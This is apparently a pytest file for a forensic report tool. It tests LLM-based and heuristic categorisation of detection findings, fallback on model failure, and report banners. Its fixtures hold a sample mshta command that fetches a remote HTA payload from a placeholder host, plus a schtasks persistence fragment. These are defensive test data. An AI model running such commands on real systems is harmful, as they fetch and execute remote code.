"""N8 report-layer analysis — LLM dissection + deterministic fallback."""

from __future__ import annotations

import json

from nexus.integration.dfir_report import build_dfir_markdown
from nexus.langgraph.report_analysis import (
    analyze_cluster,
    case_assessment,
    category_for,
)


def _mshta_finding(**kw):
    base = {
        "id": "F-1",
        "title": "Signal: mshta — 5 hit(s) across hayabusa",
        "status": "APPROVED",
        "severity": "high",
        "technique_ids": ["T1218"],
        "evidence": [{
            "time": "2019-05-21T15:32:57",
            "source": "hayabusa/evtx.csv",
            "detail": 'RuleTitle: MSHTA exec · CommandLine: mshta http://x/y.hta',
            "loc": "hayabusa\\evtx.csv:3",
        }],
    }
    base.update(kw)
    return base


_ROWS = [{
    "detail": "CommandLine: mshta http://x",
    "time": "2019-05-21T15:32:57",
    "source": "hayabusa/evtx.csv",
}]


def test_heuristic_category_from_technique_id():
    """No model → deterministic category from technique IDs / keywords."""
    a = analyze_cluster([_mshta_finding()], _ROWS, model=None)
    assert a["source"] == "heuristic"
    assert a["category"] == "defense_evasion"  # T1218 → tactic map
    assert category_for([{"title": "schtasks /Create MSOFFICE_"}], []) == "persistence"


def test_llm_block_overrides_category_and_adds_narrative():
    class _Fake:
        def invoke(self, msgs):
            class R:
                content = json.dumps({
                    "category": "execution",
                    "what": "mshta.exe pulled a remote HTA payload",
                    "why": "living-off-the-land proxy execution",
                    "how": "inferred: remote HTA via mshta",
                    "who_when": "host row 2019-05-21T15:32:57",
                    "verify": ["pull parent process"],
                    "caveats": ["could be admin tooling"],
                })
            return R()

    a = analyze_cluster([_mshta_finding()], _ROWS, model=_Fake())
    assert a["source"] == "llm"
    assert a["category"] == "execution"  # LLM category overrides heuristic
    assert a["what"] == "mshta.exe pulled a remote HTA payload"
    assert a["verify"] == ["pull parent process"]


def test_llm_bad_json_falls_back_to_heuristic():
    class _Bad:
        def invoke(self, msgs):
            class R:
                content = "not json at all"
            return R()

    a = analyze_cluster([_mshta_finding()], _ROWS, model=_Bad())
    assert a["source"] == "heuristic"


def test_llm_exception_falls_back():
    """An LLM that raises mid-report must not break report generation."""
    class _Boom:
        def invoke(self, msgs):
            raise RuntimeError("endpoint down")

    a = analyze_cluster([_mshta_finding()], _ROWS, model=_Boom())
    assert a["source"] == "heuristic"
    assert a["category"] == "defense_evasion"


def test_case_assessment_heuristic_scope():
    clusters = [[_mshta_finding()]]
    analyses = {0: analyze_cluster(clusters[0], _ROWS, model=None)}
    assess = case_assessment(clusters, analyses, {0: _ROWS}, model=None)
    assert assess["source"] == "heuristic"
    assert "hayabusa" in assess["scope"]
    assert "defense_evasion" in assess["categories"]


def test_report_renders_assessment_and_analyst_read():
    md = build_dfir_markdown(
        case_id="CASE-X", case_name="X",
        findings=[_mshta_finding()],
        evidence=[], timeline=[],
        include_draft=True, llm=False,
    )
    assert "## Assessment" in md
    assert "**Analyst read**" in md
    assert "`defense_evasion`" in md
    assert "not examiner-approved" in md


def test_report_llm_banner_marks_assisted_sections():
    """When any analysis ran through the LLM the banner must say so."""
    import nexus.langgraph.report_analysis as ra

    class _Fake:
        def invoke(self, msgs):
            class R:
                content = json.dumps({
                    "category": "execution", "what": "w", "why": "y",
                    "how": "h", "who_when": "u",
                    "verify": [], "caveats": [],
                    "sequence": "s", "scope": "sc", "confidence": "low",
                    "gaps": [], "recommended": [],
                })
            return R()

    orig = ra.resolve_model
    ra.resolve_model = lambda: _Fake()
    try:
        md = build_dfir_markdown(
            case_id="CASE-X", case_name="X",
            findings=[_mshta_finding()],
            evidence=[], timeline=[],
            include_draft=True, llm=True,
        )
    finally:
        ra.resolve_model = orig
    assert "LLM-assisted" in md
    assert "Probable sequence" in md or "s" in md
